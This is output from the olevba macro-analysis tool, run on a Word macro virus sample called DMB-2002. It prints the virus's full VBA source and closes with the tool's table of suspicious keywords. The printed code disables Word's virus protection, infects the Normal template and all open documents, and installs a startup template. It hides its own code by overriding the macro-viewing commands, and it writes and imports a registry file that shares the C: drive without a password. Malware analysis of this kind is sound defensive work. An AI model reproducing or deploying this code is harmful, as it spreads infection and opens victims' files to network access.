olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DMB
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DMB - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO dmb2002.bas 
in file: Virus.MSWord.DMB - OLE stream: 'Macros/VBA/dmb2002'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub CopyDMB()

'Ïîâòîðèì íà âñÿêèé ñëó÷àé
On Error Resume Next
With Application.Options
 .ConfirmConversions = False
 .VirusProtection = False
 .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
'DMB-2002 Header'
Dim nt As Object, ad As Object
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If nt.Lines(9, 1) <> "'DMB-2002 Header'" Then nt.DeleteLines 1, nt.CountOfLines
If nt.CountOfLines = 0 Then nt.InsertLines 1, ad.Lines(1, ad.CountOfLines)
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
    With Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule
     If .Lines(9, 1) <> "'DMB-2002 Header'" Then .DeleteLines 1, .CountOfLines
     If .CountOfLines = 0 Then .InsertLines 1, nt.Lines(1, nt.CountOfLines)
    End With
Next k
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\Program Files\Microsoft Office\Office\STARTUP"
    .SearchSubFolders = False
    If .Execute > 0 Then GoTo r1
End With
Documents.Add Template:="", NewTemplate:=True
ActiveDocument.SaveAs FileName:= _
        "C:\Program Files\Microsoft Office\Office\STARTUP\autosave.dot", _
        FileFormat:=wdFormatTemplate, LockComments:=False, Password:="", _
        AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, _
        EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData _
        :=False, SaveAsAOCELetter:=False
 With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        .AddFromString ("sub viewvbcode()" & ":" & "end sub")
        .AddFromString ("sub ToolsMacro()" & ":" & "end sub")
        .AddFromString ("sub FileTemplates()" & ":" & "end sub")
    ActiveDocument.Save
    ActiveDocument.Close
  End With
r1:
Dim c As String
If Asc((System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C", _
     "Flags")) = 146) Then GoTo exits1
Open "c:\nc.dll" For Output As #1
c = "REGEDIT4"
Print #1, c
c = "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\C]"
Print #1, c
c = Chr(34) & "Flags" & Chr(34) & "=dword:00000192"
Print #1, c
c = Chr(34) & "Type" & Chr(34) & "=dword:00000000"
Print #1, c
c = Chr(34) & "Path" & Chr(34) & "=" & Chr(34) & "C:\\" & Chr(34)
Print #1, c
c = Chr(34) & "Parm2enc" & Chr(34) & "=hex:"
Print #1, c
c = Chr(34) & "Parm1enc" & Chr(34) & "=hex:"
Print #1, c
c = Chr(34) & "Remark" & Chr(34) & "=" & Chr(34) & Chr(34)
Print #1, c
Close #1
Shell "regedit c:\nc.dll"
Kill "c:\nc.dll"
exits1:
' Çàêîí÷èëè ñ ïîâòîðåíèåì

   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = 0
   Options.SaveNormalPrompt = 0
   Dim pth As String, i As Byte, j As Byte, dc As Object, dc1 As Object, NInst As Boolean
   Application.VBE.MainWindow.Visible = False
   
   'Ñîòðåì âñå èç Normal
m1:
   Set dc1 = NormalTemplate.VBProject.VBComponents
   For i = 1 To dc1.Count
     If dc1(i).Name <> "dmb2002" And dc1(i).Name <> "ThisDocument" Then
       dc1.Remove NormalTemplate.VBProject.VBComponents(i)
       GoTo m1
    End If
   Next i
   
   'Ñîõíàíèìñÿ â ôàéëå
   Set dc = ActiveDocument.VBProject.VBComponents
   pth = Environ("temp") & "\~WRr000^.tmp"
   For i = 1 To dc.Count
   If dc(i).Name = "dmb2002" Then
   dc(i).Export pth
   End If
   Next i
  
   'Çàïèøåìñÿ â Normal
   Set dc = NormalTemplate
   Set dc1 = NormalTemplate.VBProject.VBComponents
      For j = 1 To dc1.Count
       If dc1(j).Name = "dmb2002" Then
         NInst = True
       End If
      Next j
   If NInst = False Then
      dc.VBProject.VBComponents.Import pth
   End If
   If NormalTemplate.Saved = False Then NormalTemplate.Save
   
m2:
   'Ñîòðåì èç âñåãî îñòàëüíîãî
   For i = 1 To Application.Documents.Count
      Set dc1 = Application.Documents.Item(i).VBProject.VBComponents
      For j = 1 To dc1.Count
        If dc1(j).Name <> "dmb2002" And dc1(j).Name <> "ThisDocument" Then
           dc1.Remove Application.Documents.Item(i).VBProject.VBComponents(j)
           GoTo m2
        End If
      Next j
    Next i
   
   'Çàïèøåìñÿ âî âñå îñòàëüíûå äîêóìåíòû
   For i = 1 To Application.Documents.Count
      NInst = False
      Set dc1 = Application.Documents.Item(i).VBProject.VBComponents
      For j = 1 To dc1.Count
        If dc1(j).Name = "dmb2002" Then NInst = True
      Next j
      If NInst = False Then
         Application.Documents.Item(i).VBProject.VBComponents.Import pth
      End If
   Next i
   
   
End Sub
Sub AutoExec()
    MsgBox "Â äîêóìåíòå îáíàðóæåí ìîäóëü ÄÌÁ-2002", vbOKOnly, "Âíèìàíèå!"
End Sub
Sub AutoOpen()
   CopyDMB
End Sub
Sub AutoClose()
   AutoOpen
End Sub
Sub Document_New()
   AutoOpen
End Sub
Sub ViewVBCode()
If Dir("c:\dmb.die") <> "" Then
   MsgBox "Âàñ ïðèâåòñòâóåò ìîäóëü ÄÌÁ-2002"
   Application.VBE.MainWindow.Visible = True
Else
   MsgBox "Ó âàñ íåóñòàíîâëåí Visual Basic"
End If
End Sub
Sub ToolsMacro()
If Dir("c:\dmb.die") <> "" Then
   MsgBox "Âàñ ïðèâåòñòâóåò ìîäóëü ÄÌÁ-2002"
   Dialogs(wdDialogToolsMacro).Show
Else
   MsgBox "Äîêóìåíò íå ñîäåðæèò ìàêðîñîâ"
End If
End Sub
Sub FileSave()
On Error Resume Next
Call AutoOpen
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call AutoOpen
Dialogs(wdDialogFileSaveAs).Show
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |nc.dll              |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

